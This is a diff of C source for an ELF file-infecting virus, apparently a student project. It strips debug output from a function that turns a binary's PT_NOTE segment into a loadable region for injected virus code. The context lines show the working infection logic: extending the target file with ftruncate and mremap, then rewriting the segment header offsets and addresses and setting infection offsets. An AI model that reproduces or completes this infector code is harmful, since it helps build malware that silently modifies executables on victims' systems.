@@ -33,14 +33,6 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 		note = &data->segments[i];
 
 		if (note->p_type == PT_NOTE) {
-			printf("\n\033[1;34mOLD\033[0m segment:\n");
-			printf("Type (1 LOAD, 4 NOTE):\t0x%d\n", note->p_type);
-			printf("Flags:\t\t\t0x%d\n", note->p_flags);
-			printf("Start in file:\t\t0x%04lx\n", note->p_offset);
-			printf("Virtual address:\t0x%04lx\n", note->p_vaddr);
-			printf("Size in file:\t\t0x%04lx\n", note->p_filesz);
-			printf("Size in mem:\t\t0x%04lx\n", note->p_memsz);
-			printf("Alignment:\t\t0x%04lx\n\n", note->p_align);
 			note_index = i;
 			break;
 		}
@@ -54,26 +46,16 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	new_seg_size = note->p_filesz + this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
 	new_seg_size += 0x1000 - (new_seg_size % 0x1000);
 
-	printf("\033[1mTaille du segment: %lx\n\033[0m", new_seg_size);
-	printf("Taille du virus: %lx\nSignature off+len: %x\nAlignement: %lx\n\n", this->size,
-		SIGNATURE_LEN + SIGNATURE_OFFSET, 0x1000 + (new_seg_size % 0x1000));
-
-	printf("\nftruncate: original (%lx) + new_seg_size (%lx) + padding (%lx)\n\n", data->original_size, new_seg_size, 0x1000 - data->original_size % 0x1000);
 	// Extend
 	ftruncate(ret, data->fd, data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000));
 	if (ret < 0) {
-		printf(FILE_LINE("ftruncate \033[31mfailed\033[0m: %ld\n"), ret);
 		return true;
 	}
 	mremap(ret, data->file, data->original_size,
 		data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000), MREMAP_MAYMOVE);
 	if (ret >= -22 && ret < 0) {
-		printf(FILE_LINE("mremap \033[31mfailed\033[0m: %ld\n"), ret);
 		return true;
 	}
-
-	printf("Size: 0x%lx -> 0x%lx\n", data->original_size,
-		data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000));
 
 	//	Resetting data fields to match the new mmap
 	data->file = (byte *)ret;
@@ -86,15 +68,6 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	exec = exec_segment(data);
 	(void)exec;
 
-	printf("\033[1;36mSAME\033[0m segment:\n");
-	printf("Type (1 LOAD, 4 NOTE):\t0x%d\n", note->p_type);
-	printf("Flags:\t\t\t0x%d\n", note->p_flags);
-	printf("Start in file:\t\t0x%04lx\n", note->p_offset);
-	printf("Virtual address:\t0x%04lx\n", note->p_vaddr);
-	printf("Size in file:\t\t0x%04lx\n", note->p_filesz);
-	printf("Size in mem:\t\t0x%04lx\n", note->p_memsz);
-	printf("Alignment:\t\t0x%04lx\n\n", note->p_align);
-
 	//	Changing the values of the PT_NOTE header
 	if (find_pvaddr(data, note, new_seg_size))
 		return true;
@@ -106,15 +79,6 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	note->p_offset = data->original_size + 0x1000 - (data->original_size % 0x1000);
 	note->p_align  = exec->p_align;
 	
-	printf("\033[1;32mNEW\033[0m segment:\n");
-	printf("Type (1 LOAD, 4 NOTE):\t0x%d\n", note->p_type);
-	printf("Flags:\t\t\t0x%d\n", note->p_flags);
-	printf("Start in file:\t\t0x%04lx\n", note->p_offset);
-	printf("Virtual address:\t0x%04lx\n", note->p_vaddr);
-	printf("Size in file:\t\t0x%04lx\n", note->p_filesz);
-	printf("Size in mem:\t\t0x%04lx\n", note->p_memsz);
-	printf("Alignment:\t\t0x%04lx\n\n", note->p_align);
-
 	//	Adding elf_data
 	data->infection_offset_file = note->p_offset + note_size; 
 	data->infection_offset_mem  = note->p_vaddr + note_size;
@@ -150,12 +114,10 @@ static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
 
 	current = vmax + new_seg_size;
 	if (current < vmax) {
-		printf("vmax + new_seg_size overflowed\n");
 		return true;
 	}
 	current = pmax + new_seg_size;
 	if (current < pmax) {
-		printf("pmax + new_seg_size overflowed\n");
 		return true;
 	}
 
